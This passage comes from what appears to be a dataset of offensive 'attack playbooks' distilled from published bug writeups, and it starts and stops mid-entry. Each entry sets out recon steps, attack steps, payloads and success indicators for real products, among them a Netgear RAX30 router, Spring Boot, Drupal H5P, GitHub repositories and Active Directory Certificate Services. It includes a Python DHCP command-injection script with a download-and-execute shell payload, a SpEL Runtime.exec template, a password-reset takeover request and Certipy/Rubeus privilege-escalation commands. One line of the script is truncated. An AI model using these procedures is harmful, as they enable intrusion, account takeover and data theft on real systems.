No command execution is observed. This could indicate an updated firmware version with patched vulnerability or different parsing logic. Pivot to analyzing other binaries or services.

playbooks.impact: Remote Code Execution (RCE) on the Netgear RAX30 router, allowing an attacker to gain full control of the device, potentially download malicious binaries, establish reverse shells, or use the router as a pivot point for further network attacks.
playbooks.key_lesson: When analyzing embedded device firmware, always inspect binaries that process network-accessible headers like 'User-Agent' for potential command injection vulnerabilities, especially if they interact with system commands.

meta.title: The Last Breath of Our Netgear RAX30 Bugs - A Tragic Tale before Pwn2Own Toronto 2022
meta.authors: Vu Thi Lan, Nguyá» n HoÃ ng Tháº¡ch

trigger_conditions.when_to_apply: This technique is applicable when the target device's DHCP service is exposed on the LAN interface and improperly sanitizes user-supplied data in the DHCP hostname option, leading to command injection.
prerequisites: Attacker must be on the same local network as the target router.
applicability_signals: DHCP service is accessible from the LAN.
Firmware version is known to be vulnerable (e.g., 1.0.7.78 and earlier).
skip_if: The DHCP service is not exposed on the LAN.
The firmware has been patched to properly sanitize the hostname input in DHCP requests.

recon_steps: Step 1: Identify the target device and its firmware version on the local network.
Step 2: Confirm the DHCP service is running and accessible from the LAN (e.g., by observing DHCP traffic or attempting to obtain an IP address).
attack_steps: Step 1: Craft a DHCP request packet with the `DHCPREQUEST` type.
Step 2: Include a malicious payload within the `DHCP_HOST_NAME` option, ensuring it fits within the 63-byte limit.
Step 3: Send the crafted DHCP request packet to the target router's IP address on UDP port 67.
Step 4: Observe the router's response or any side effects indicating command execution.
payloads_or_patterns:
```python
import dhcppython
from ipaddress import IPv4Address
import socket
import sys

def send_requests_packet(hostname):
    opt_list = dhcppython.options.OptionList([
        dhcppython.options.options.short_value_to_object(53, "DHCPREQUEST"),
        dhcppython.options.options.short_value_to_object(54, "192.168.5.1"), # Example server ID
        dhcppython.options.options.short_value_to_object(50, "192.168.5.11"), # Example requested IP
        dhcppython.options.options.short_value_to_object(12, hostname), # Malicious hostname
        dhcppython.options.options.short_value_to_object(55, [1, 3, 6, 15, 26, 28, 51, 58, 59, 43])
    ])
    pkt = dhcppython.packet.DHCPPacket(
        op="BOOTREQUEST", 
        htype="ETHERNET", 
        hlen=6, 
        hops=0, 
        xid=123456, 
        secs=0, 
        flags=0, 
        ciaddr=IPv4Address(0), 
        yiaddr=IPv4Addr # This line appears truncated in the writeup
    )
    pkt.options = opt_list
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.sendto(pkt.tobytes(), ('<TARGET_IP>', 67)) # Replace <TARGET_IP>

# Example payload: `touch /tmp/pwned;`
malicious_hostname = "$(touch /tmp/pwned;)"
send_requests_packet(malicious_hostname)
```

Replace `<TARGET_IP>` with the router's IP address. The payload can be adjusted to execute arbitrary commands, e.g., `$(reboot;)` or `$(wget http://<attacker_ip>/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh;)`
tools_recommended: Scapy (for crafting and sending raw packets)
Wireshark (for analyzing DHCP traffic)
Custom Python script using `dhcppython` or similar libraries
success_indicators: Creation of a file on the router's filesystem (e.g., `/tmp/pwned` if `touch` command is used).
Receipt of unexpected network traffic from the router.
Device reboot if `reboot` command is used.
Execution of arbitrary commands as root.
failure_indicators: No response from the router, or a standard DHCP offer is received without command execution (router might have patched the vulnerability).
403 Forbidden or similar error if a WAF is present, though unlikely for internal DHCP traffic.
If the hostname length is exceeded, the payload might be truncated and not executed.

playbooks.impact: Remote Code Execution (RCE) with root privileges on the Netgear RAX30 router, allowing an attacker to take full control of the device, modify its configuration, intercept traffic, or use it as a pivot for further attacks on the internal network.
playbooks.key_lesson: Always scrutinize user-controlled input within network services, especially those that are unauthenticated, and verify how they are passed to system commands or other vulnerable functions.

meta.title: Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass

affected_components: Error page handling for unhandled exceptions
tech_stack_fingerprints: Spring Boot error messages containing mathematical results when injecting `${x*y}` into `q` parameter

trigger_conditions.when_to_apply: When a web application using Spring Boot displays error messages that include user-controllable input, and that input is evaluated as a SpEL expression.
prerequisites: Target application is running a vulnerable version of Spring Boot.
User-controllable input is reflected within an error message shown on the page.
The input is evaluated using Spring Expression Language (SpEL).
applicability_signals: Injecting `${7*7}` into a user-controllable parameter (e.g., `q`) results in the number `49` being displayed in the error message.
Akamai WAF is in place, requiring bypass techniques.
skip_if: No indication of Spring Boot error handling reflecting user input.
WAF blocks all SpEL injection attempts without bypass.

recon_steps: Step 1: Identify endpoints that accept user input and might return error messages. Look for parameters that, when injected with simple mathematical expressions like `${7*7}`, return the computed result in the response body.
Step 2: Confirm that the target application is indeed running Spring Boot and vulnerable error page handling. The presence of the `${x*y}` evaluation is a strong indicator.
attack_steps: Step 1: Construct a SpEL expression to achieve RCE. The general form is `${ T(java.lang.Runtime).getRuntime().exec('command') }`.

Step 2: Identify how to bypass the Akamai WAF. This involves iterative attempts with various obfuscation techniques for SpEL expressions (e.g., character encoding, string concatenation, using different class names or methods).
Step 3: Craft payloads to obtain necessary Java objects or methods (e.g., `T(java.lang.Character).TYPE`) when direct `Runtime.exec` is blocked or complex.
Step 4: Experiment with different ways to execute commands, potentially using `ProcessBuilder` or indirect methods if `Runtime.exec` is problematic.
Step 5: Assemble the final payload, ensuring it bypasses the WAF and achieves command execution.
payloads_or_patterns: Various obfuscated SpEL payloads targeting WAF bypass. Examples might include: using hex encoding for characters, string concatenation, alternative class loading, etc. (Specific examples depend on the exact WAF rules observed).
tools_recommended: Burp Suite: To intercept and modify requests, observe responses, and facilitate iterative testing.
Custom scripting: For automating WAF bypass attempts and payload generation.
success_indicators: Successful execution of an OS command, such as `uname -a`, with the output reflected in the error message or a subsequent response.
Receiving a callback from a remote server if the executed command attempts to connect out.
failure_indicators: Receiving a 403 Forbidden response from Akamai WAF for all payload attempts.
Error messages without any computed results, indicating SpEL injection is not working or is being sanitized differently.
Payloads returning errors related to class not found or method not found, indicating the current SpEL context is insufficient or the payload is malformed.

playbooks.impact: Remote Code Execution (RCE) on the server, allowing an attacker to run arbitrary operating system commands, potentially leading to full system compromise, data exfiltration, or further exploitation.
playbooks.key_lesson: When encountering WAF-protected web applications, analyze the specific WAF rules and develop custom obfuscation techniques for known injection vectors like SSTI to achieve bypass and exploitation.

meta.title: Hijacking GitHub Repositories by Deleting and Restoring Them

trigger_conditions.when_to_apply: This technique is applicable when an attacker can identify a popular GitHub repository that was recently renamed by its owner. The attacker needs to check if the repository was eligible for the 'popular repository namespace retirement' and subsequently verify if the bypass condition related to deletion and restoration is present.
prerequisites: The target repository must have been renamed by its owner.
The attacker must be able to register a new GitHub account with the original, now freed-up, username.
The original repository must have been deleted and then restored, or deleted and the attacker is able to recreate it within the 90-day restoration window.
applicability_signals: Observing a GitHub user rename their account and their repositories.
Identifying a repository that was previously owned by a renamed account and is now available for creation under the old username.

The writeup implies that if a repository was deleted and then restored by the original owner, it might re-enable the redirect, making it vulnerable to takeover by recreating the repository under the old name.
skip_if: The repository has not been renamed.
The original username is still in use by another active user.
The repository was not deleted or the 90-day restoration window has passed.
GitHub's namespace retirement mechanism is fully effective and prevents repository creation even after deletion/restoration.

recon_steps: Step 1: Monitor GitHub for user account renames. Look for users changing their usernames, which frees up their old namespaces.
Step 2: Identify repositories that were owned by the renamed accounts. Check if these repositories had their original names (namespace/repo_name) freed up.
Step 3: Investigate the deletion and restoration status of repositories owned by renamed accounts. If a repository was deleted and is within the 90-day restoration window, it's a potential target.
attack_steps: Step 1: Register a new GitHub account using the old, freed-up username of the victim user (e.g., `victim_username`).

Step 2: Create a new repository on this attacker-controlled account with the exact same name as the victim's original repository (e.g., `victim_username/original_repo_name`). This action should break the redirect that GitHub previously set up for the renamed repository.

Step 3: If the victim had deleted their repository and it was within the 90-day restoration period, and the attacker's recreation of the repository under the old name takes precedence, the attacker now controls the namespace.
Step 4: The attacker can then choose to restore their deleted repository, or if they are the 'owner' of the namespace, they may have effectively hijacked the repository's identity.
payloads_or_patterns: N/A (This is an account and repository manipulation process, not a direct payload injection)
tools_recommended: Custom scripts for monitoring GitHub user renames and repository availability.
Browser automation tools (e.g., Selenium) for account creation and repository management.
success_indicators: The attacker successfully creates a repository with the exact name `old_username/repository_name`.
Subsequent attempts to access the repository via the renamed URL (e.g., `new_username/repository_name`) now point to the attacker's repository, or the redirect is broken.
Pull requests or other processes that relied on the old repository name now point to the attacker's repository.
failure_indicators: The attacker is unable to create a repository with the old `username/repository_name` due to GitHub's namespace retirement policies.
The redirect from the old repository name to the new one remains intact despite the attacker's actions.
GitHub flags the account creation or repository creation as suspicious or disallowed.

playbooks.impact: An attacker can gain control of a popular GitHub repository that was previously renamed by its owner. This allows the attacker to serve malicious code to users who are still referencing the old repository name through dependencies or direct links, potentially compromising the software supply chain.
playbooks.key_lesson: When researching GitHub, always check for repository rename events and investigate the possibility of repo jacking through namespace manipulation, particularly if deletion and restoration features are involved.

meta.title: Drupal H5P Module <= 2.0.0 (isValidPackage) Zip Slip Vulnerability

trigger_conditions.when_to_apply: When the target is a Drupal instance running on a Windows server and the H5P module version is 2.0.0-alpha2 or prior, or version 7.x-1.50 or prior.
prerequisites: Attacker must have an authenticated user account on the Drupal instance.
Target must be running on a Windows operating system.
applicability_signals: H5P module is installed and the version can be determined to be vulnerable.
The system hosting Drupal is identifiable as Windows-based (e.g., through error messages, file paths in other vulnerabilities, or specific server headers if accessible).
skip_if: H5P module is updated to a patched version.
Target system is not Windows-based.

recon_steps: Step 1: Identify the Drupal version and installed modules, specifically checking for the H5P module and its version.

Step 2: Attempt to determine if the underlying operating system of the Drupal server is Windows. This might be inferred from error messages, file paths encountered in other exploits, or specific application behavior.
attack_steps: Step 1: Craft a malicious H5P archive (ZIP file). This archive should contain files with path traversal sequences (e.g., ../../../etc/passwd) in their filenames, targeting a sensitive file like a configuration file or an executable script.
Step 2: Upload the crafted malicious H5P archive through the H5P module's upload functionality.

Step 3: Monitor the server for any resulting changes or errors that indicate successful file overwrite or access. This might involve trying to overwrite a file that, when later accessed, reveals its content or causes a specific error.
payloads_or_patterns: Create a ZIP archive containing a file named '../../../../../../windows/win.ini' (or similar path traversal to a known file) with malicious content. The exact traversal depth will depend on the Drupal installation path and the target file's location.
tools_recommended: Zip utility (e.g., `zip` command-line tool) for creating the malicious archive.
Burp Suite or similar proxy to intercept and potentially modify upload requests if needed, though direct upload is the primary vector.
success_indicators: The H5P module accepts the upload and does not immediately reject it due to the traversal sequences.
Subsequent attempts to access the overwritten file (e.g., retrieving 'win.ini' content or observing its modified state) reveal the attacker-controlled content or cause an observable change.
If overwriting a file that leads to XSS, observing reflected script execution in the browser.
failure_indicators: The H5P module rejects the uploaded file with an error indicating invalid characters or path traversal attempt (though the regex bypass means this is less likely on Windows).
No observable change in the target file after upload, indicating the traversal was ineffective or targeted the wrong file/location.

playbooks.impact: Allows an attacker to overwrite semi-arbitrary files on the server's file system, potentially leading to Remote Code Execution (RCE) by overwriting configuration files, scripts, or executables. It can also lead to Stored Cross-Site Scripting (XSS) by overwriting files that are rendered in the browser.
playbooks.key_lesson: When analyzing path traversal vulnerabilities in file upload functionalities, always consider OS-specific behaviors and bypasses, particularly on Windows where directory separators and traversal sequences can differ and interact with regular expression logic in unexpected ways.

meta.title: A $$$ worth of cookies! | Reflected DOM-Based XSS | Bug Bounty POC

affected_components: JavaScript files within the main domain, specifically functions handling car viewer components and rendering React applications.
tech_stack_fingerprints: Parsing `state` attribute from an HTML element

trigger_conditions.when_to_apply: When JavaScript code on the target application uses user-controlled input (like from a URL parameter) to construct `href` attributes of anchor (`<a>`) tags without proper sanitization.
prerequisites: The target application must be using JavaScript frameworks or libraries that render dynamic content based on URL parameters.
The existence of JavaScript files that can be analyzed for source and sink vulnerabilities.
applicability_signals: Observation of JavaScript code that processes URL parameters (e.g., `returnPath` in the writeup).
Identification of `<a>` tags where the `href` attribute is dynamically set based on these parameters.
The presence of `document.addEventListener('DOMContentLoaded', ...)` or similar event listeners that parse and render application state.
skip_if: All user-supplied input used in `href` attributes is properly encoded or sanitized.
The application does not expose sensitive JavaScript files for analysis.
No observable interaction between URL parameters and anchor tag `href` attributes.

recon_steps: Step 1: Identify and retrieve JavaScript files from the target domain. Look for files related to core application logic or specific components (e.g., 'car viewer').
Step 2: Analyze retrieved JavaScript files for functions that process URL parameters or other external inputs.
Step 3: Identify potential sources (e.g., URL parameters, `window` object properties) and sinks (e.g., `innerHTML`, `href`, `src` attributes, `eval()` function) within the JavaScript code.
Step 4: Specifically look for sink functions that are vulnerable to DOM-based XSS, such as setting `href` attributes of `<a>` tags with unsanitized user input.
attack_steps: Step 1: Craft a malicious URL by appending a JavaScript payload to a susceptible parameter (e.g., `returnPath`). The payload should be a valid JavaScript URI scheme like `javascript:alert(document.domain)`.
Step 2: Navigate to the crafted URL using the target domain (e.g., `<TARGET_URL>?returnPath=javascript:alert(document.domain)`).
Step 3: Observe the browser's behavior to check for the execution of the JavaScript payload.
tools_recommended: Browser Developer Tools: Inspecting JavaScript code, analyzing DOM changes, and monitoring network requests.
Burp Suite: Capturing and modifying HTTP requests, especially for crafting malicious URLs and analyzing responses.
success_indicators: A JavaScript alert box displaying the target domain (e.g., `alert(document.domain)` executes successfully).
Unexpected JavaScript execution or behavior triggered by the crafted URL.
failure_indicators: The payload is not executed, and the page loads normally without any JavaScript alerts.
The `href` attribute is sanitized or encoded, preventing JavaScript execution (e.g., `javascript:` is stripped or `alert` is escaped).
A 4xx or 5xx error response, indicating a different issue or WAF blocking.

playbooks.impact: Execution of arbitrary JavaScript code in the context of the victim's browser session. This can lead to session hijacking, data theft (e.g., cookies, sensitive information displayed on the page), phishing attacks, or defacement.
playbooks.key_lesson: Always analyze JavaScript files for DOM-based XSS vulnerabilities, paying close attention to how URL parameters or other external inputs are used to construct sensitive DOM elements like anchor tag `href` attributes.

meta.title: Hacking on a plane: Leaking data of millions and taking over any account

trigger_conditions.when_to_apply: When an authenticated user can retrieve their own account details via an API endpoint that accepts identifying parameters like 'user_name', 'email_address', or 'customer_id'. This technique is also applicable if the password reset functionality allows manipulation of the target user identifier.
prerequisites: Attacker has an authenticated session with the target application.
applicability_signals: API endpoints returning sensitive user data (e.g., PERSONAL, PMTINSTRUMENTS) in the response.
User identification parameters ('user_name', 'email_address', 'customer_id') are present in requests that fetch user data.
Password reset functionality uses an endpoint that accepts a user identifier for modification.
skip_if: API responses for user data do not contain discernible user identifiers that can be manipulated.
Password reset functionality requires verification steps that cannot be bypassed (e.g., email confirmation that is strictly validated).

recon_steps: Intercept requests made by an authenticated user using a proxy (e.g., Burp Suite).
Analyze API responses for sensitive information and identify parameters used to identify the current user (e.g., 'user_name', 'customer_id', 'email_address').
attack_steps: Send a GET request to '/edge/apidecorator/v3/customer' with parameters like 'data_types', 'requester', 'tracking_id', and crucially, 'user_name' set to your own username. Observe the response containing your account details.

Create a new account and obtain its 'user_name'. Send a GET request to '/edge/apidecorator/v3/customer' with your session token but replace the 'user_name' parameter with the 'user_name' of the new account.

If the previous step reveals data from the new account, repeat the process by substituting 'email_address' and 'customer_id' for the 'user_name' parameter to enumerate and retrieve data for other users.
Identify the password reset endpoints (e.g., POST /edge/apidecorator/v2/customer/authenticate/ and PUT /edge/apidecorator/v2/customer/).
Perform the password reset flow. After the initial authentication request, intercept the subsequent PUT request to '/edge/apidecorator/v2/customer/'.
Modify the 'user' field in the PUT request to the 'user_name' of the target account whose password you wish to reset, and set a new desired password in the 'resetPassword.password' field.
Send the modified PUT request to complete the account takeover.
payloads_or_patterns:
PUT /edge/apidecorator/v2/customer/ HTTP/1.1
Host: internet.com
Content-Type: application/json

{ "resetPassword" : { "password" : "<NEW_PASSWORD>" }, "user" : "<TARGET_USER_NAME>" , "uxdId" : "<UXD_ID_FROM_PREVIOUS_RESPONSE>" }
tools_recommended: Burp Suite: For intercepting and modifying HTTP requests.
Burp Suite Intruder: For enumerating 'user_name', 'email_address', and 'customer_id' parameters.
success_indicators: Receiving a 200 OK response with the personal and payment instrument details of another user when manipulating the 'user_name', 'email_address', or 'customer_id' parameters.
Successfully logging in to another user's account after completing the password reset manipulation with the new password.
failure_indicators: Receiving a 401 Unauthorized or 403 Forbidden response when attempting to access another user's data, indicating access controls are strictly enforced.
Password reset attempts fail with errors if the 'user' field is not correctly formatted or if other validation steps are in place.

playbooks.impact: Unauthorized access to millions of users' personal identifiable information (PII), including name, address, and email. Access to payment instrument details such as last 4 digits of credit cards, expiration dates, and billing addresses. Ability to take over any user account by resetting their password without user interaction.
playbooks.key_lesson: Always test if identifying parameters in API requests (e.g., user_name, customer_id, email) can be manipulated to access or modify data belonging to other users, especially in endpoints returning sensitive information or handling account management functions like password resets.

meta.title: Pre-Auth RCE with CodeQL in Under 20 Minutes

affected_components: web interface (when run in server mode)

trigger_conditions.when_to_apply: When pgAdmin is deployed in server mode and accessible via a web interface. This technique relies on static code analysis, not direct interaction with a running instance.
prerequisites: Access to the source code of pgAdmin.
A CodeQL environment set up with VS Code extension.
applicability_signals: pgAdmin being deployable as a web application in server mode.
The existence of a web directory within the pgAdmin GitHub repository.
skip_if: No access to the pgAdmin source code.
Unable to set up or use CodeQL.

recon_steps: Step 1: Fetch the latest version of the pgAdmin source code from its GitHub repository.
Step 2: Identify the primary programming language of the project (Python in this case).
Step 3: Install the CodeQL extension for VS Code.
attack_steps: Step 1: Create a CodeQL database for the pgAdmin Python source code using the CodeQL CLI: `codeql database create <database_name> --language=python`.
Step 2: Import the newly created CodeQL database into the VS Code workspace.
Step 3: Set the imported database as the default for CodeQL queries.
Step 4: Clone the official CodeQL GitHub repository into the VS Code workspace to access pre-built security queries.
Step 5: Navigate to `codeql/python/ql/src/Security` within the cloned CodeQL repository.
Step 6: Execute relevant pre-built CodeQL queries designed to find security vulnerabilities, particularly RCE or command injection flaws.
payloads_or_patterns: N/A (This is a code analysis technique, not a direct payload-based attack)
tools_recommended: CodeQL CLI
Visual Studio Code with CodeQL extension
Git
success_indicators: CodeQL query identifies a potential RCE or command injection vulnerability within the pgAdmin codebase.
The query provides specific line numbers and code paths leading to the vulnerability.
failure_indicators: No vulnerabilities are found by the executed CodeQL queries.
CodeQL database creation or querying fails due to incompatible versions or syntax errors.

playbooks.impact: Remote Code Execution (RCE) on the server hosting pgAdmin in server mode, allowing an attacker to execute arbitrary commands with the privileges of the pgAdmin process.
playbooks.key_lesson: Leverage static analysis tools like CodeQL to proactively identify vulnerabilities in source code, especially for applications deployed in server mode or exposed to the internet.

meta.title: CertPotato – Using ADCS to privesc from virtual and network service accounts to local system

affected_components: Certificate templates with specific Extended Key Usages (EKU) allowing for Client Authentication or PKINIT
tech_stack_fingerprints: Active Directory environment with ADCS role installed
Presence of specific certificate templates (e.g., Machine template)

trigger_conditions.when_to_apply: When an attacker has a shell on a domain-joined machine running as a virtual or network service account and Active Directory Certificate Services is configured with vulnerable certificate templates.
prerequisites: Attacker has a low-privilege shell on a domain-joined Windows machine.
The machine's service account (e.g., virtual account like iis apppool\defaultapppool, NetworkService, or LocalSystem) has the ability to enroll for certificates.
ADCS is configured with a certificate template that grants enrollment rights to the service account and has specific EKUs like 'Client Authentication' or 'PKINIT'.
applicability_signals: Ability to query AD CS server for available certificate templates.
The service account under which the shell is running.
The presence of certificate templates allowing enrollment for machine accounts or specific service accounts.
skip_if: ADCS is not installed or not configured with suitable templates.
The compromised service account does not have enrollment rights for any relevant certificate templates.
All available templates lack the necessary EKUs for authentication purposes.

recon_steps: Step 1: Identify the domain and domain controllers. Query AD for Certificate Authority (CA) servers.
Step 2: Enumerate available certificate templates on the AD CS server. Look for templates that are user-enrollable, especially those with EKUs like 'Client Authentication' or 'PKINIT'.
Step 3: Determine the current user context of the compromised shell (e.g., iis apppool\defaultapppool, NT AUTHORITY\NetworkService).
Step 4: Verify if the current user context has enrollment rights for any identified certificate templates using tools like certipy or Rubeus.
attack_steps: Step 1: Using a tool like Certipy or Rubeus, request a certificate from the AD CS server using the vulnerable template and the compromised service account's credentials.
Step 2: Extract the private key associated with the obtained certificate. This is often possible if the template allows it or if the service account has broad permissions.
Step 3: Use the obtained certificate and its private key to authenticate to the domain as the service account. Specifically, leverage the 'Client Authentication' or 'PKINIT' EKU.

Step 4: Once authenticated as the service account (which often has elevated privileges like NT AUTHORITY\SYSTEM or NetworkService), perform actions to achieve local system privileges (e.g., execute commands via PowerShell remoting if available, or use other privilege escalation techniques leveraging the service account's permissions).
payloads_or_patterns: Certipy command to request certificate: certipy req -target <TARGET_DOMAIN> -template <TEMPLATE_NAME> -username <SERVICE_ACCOUNT_NAME> -password <SERVICE_ACCOUNT_PASSWORD> -ca <CA_SERVER_NAME>
Rubeus command to request certificate (example): Rubeus.exe cert /ca:<CA_SERVER_NAME> /template:<TEMPLATE_NAME> /user:<SERVICE_ACCOUNT_NAME> /domain:<TARGET_DOMAIN>
Payload for executing commands as SYSTEM after authentication: Using PsExec or PowerShell remoting with the authenticated credentials.
tools_recommended: Certipy: For requesting and managing certificates from AD CS.
Rubeus: For Kerberos attacks, including certificate enrollment and manipulation.
PowerView: For Active Directory enumeration and reconnaissance.
PsExec: For remote execution of commands once SYSTEM privileges are obtained.
success_indicators: Successful acquisition of a certificate that can be used for authentication.
Ability to authenticate to the domain as the service account using the certificate.
Execution of commands with NT AUTHORITY\SYSTEM privileges on the target machine.
failure_indicators: Certificate request denied by AD CS due to insufficient permissions or incorrect template.
Inability to extract the private key from the certificate.
Authentication failures when trying to use the certificate.
Commands executed with the compromised service account's original privileges, not SYSTEM.

playbooks.impact: Attacker can escalate privileges from a low-privileged service account (e.g., IIS AppPool) to NT AUTHORITY\SYSTEM on a domain-joined server. This allows for complete control over the compromised machine and potentially lateral movement within the Active Directory domain.
playbooks.key_lesson: Always investigate certificate templates in Active Directory Certificate Services for misconfigurations that allow enrollment with vulnerable Extended Key Usages from low-privileged accounts, as these can lead to SYSTEM-level privilege escalation.

meta.title: Interesting find on the Invite link

trigger_conditions.when_to_apply: When the target sends an invitation link containing user registration details encoded in a Base64 parameter, and these details are not properly validated or signed.
prerequisites: Attacker can initiate an account request that results in an invitation link being sent to a controlled email address.
applicability_signals: Invitation link contains a parameter with Base64 encoded data.
Decoding the Base64 parameter reveals user registration details (first name, last name, email).
skip_if: Invitation link is a simple, non-encoded URL.
Invitation link has a short expiration time and cannot be manipulated.
Invitation link parameter is signed or validated server-side.

recon_steps: Step 1: Initiate an account registration request on redacted.com. Observe the invitation link generated and sent to the registered email.
Step 2: Decode the Base64 encoded parameter in the invitation link to verify if it contains user registration details.
attack_steps: Step 1: Take the Base64 encoded string from the invitation link.
Step 2: Decode the Base64 string to extract user details (e.g., firstName, lastName, loginId).
Step 3: Modify the extracted details (e.g., change loginId to a different email address you control).
Step 4: Re-encode the modified details back into a Base64 string.
Step 5: Construct a new invitation URL using the original domain and the newly encoded string.
Step 6: Open the crafted invitation URL in a browser and proceed with setting a password to create an account with the modified details.
tools_recommended: Online Base64 encoder/decoder
Browser developer tools to inspect network requests
success_indicators: A new account is successfully created with the attacker-controlled email address after setting a password via the crafted invitation link.
The attacker can log in to the newly created account.
failure_indicators: Invalid token error when accessing the crafted invitation link → The token is likely signed or has server-side validation.
Account creation fails with an error message after setting the password → The modified details are rejected by the server.

playbooks.impact: An attacker can create an unlimited number of accounts on the platform by reusing and modifying a single invitation link, bypassing the intended subscription or invitation-only registration process.
playbooks.key_lesson: Always validate and sign sensitive data embedded in URL parameters, especially invitation or reset tokens, to prevent manipulation.

meta.title: Command Injection in Asus M25 NAS

trigger_conditions.when_to_apply: When a NAS device like the Asus M25 is accessible and has not received firmware updates for a significant period, indicating potential unpatched vulnerabilities.
prerequisites: The target device is a network-attached storage (NAS) device.
applicability_signals: Device is identified as an Asus M25 NAS.
Firmware is old or EOL (End-of-Life).
skip_if: The device has recently received security updates.
Network access to the device is restricted or firewalled.

recon_steps: Step 1: Identify the target device as an Asus M25 NAS. Confirm its network accessibility.
Step 2: Check for known vulnerabilities related to Asus M25 NAS devices, especially command injection or similar flaws in web interfaces. Verify firmware version if possible.
attack_steps: Step 1: Send an HTTP request to the Asus M25 NAS web interface.
Step 2: Craft a malicious cookie header containing a command injection payload.
Step 3: Observe the response for signs of command execution.
tools_recommended: Burp Suite or OWASP ZAP: To intercept and modify HTTP requests, specifically the cookie header.
Nmap: To scan for open ports and identify the NAS device on the network.
success_indicators: Response indicates command execution (e.g., unexpected output, changes in device status, network callbacks if applicable).
The response might contain output from the executed command, such as a directory listing or system information.
failure_indicators: Standard 400 Bad Request or 403 Forbidden responses without any signs of command execution. This might indicate input sanitization or a WAF is in place.
No observable difference in response behavior when injecting various commands.

playbooks.impact: Remote code execution on the Asus M25 NAS device, allowing an attacker to control the device, access sensitive data stored on it, or use it as a pivot point for further network compromise.
playbooks.key_lesson: Always test cookie parameters for command injection vulnerabilities on legacy or unpatched devices, as they may not have adequate input validation.

meta.title: From Zero to Hero Part 2: From SQL Injection to RCE on Intel DCM
